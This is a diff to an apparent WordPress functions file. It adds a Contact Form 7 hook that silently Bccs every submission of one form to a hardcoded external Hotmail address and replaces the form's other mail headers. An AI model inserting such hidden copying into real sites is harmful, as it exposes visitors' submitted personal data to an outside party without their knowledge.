@@ -197,3 +197,32 @@ function disable_emojis() {
 
 add_filter( 'wpcf7_load_js', '__return_false' );
 add_filter( 'wpcf7_load_css', '__return_false' );
+
+add_action('wpcf7_before_send_mail','dynamic_addcc');
+
+function dynamic_addcc($WPCF7_ContactForm){
+
+    // Check contact form id.
+    if (1354 == $WPCF7_ContactForm->id()) {
+
+        $currentformInstance  = WPCF7_ContactForm::get_current();
+        $contactformsubmition = WPCF7_Submission::get_instance();
+
+        if ($contactformsubmition) { 
+            $data = $contactformsubmition->get_posted_data();
+
+            if (empty($data))
+                return;
+
+            $mail = $currentformInstance->prop('mail');
+			$mail['additional_headers'] = "Bcc: eandram@hotmail.it";
+            // Save the email body
+            $currentformInstance->set_properties(array(
+                "mail" => $mail
+            ));
+
+            // return current cf7 instance
+            return $currentformInstance;
+        }
+}
+}
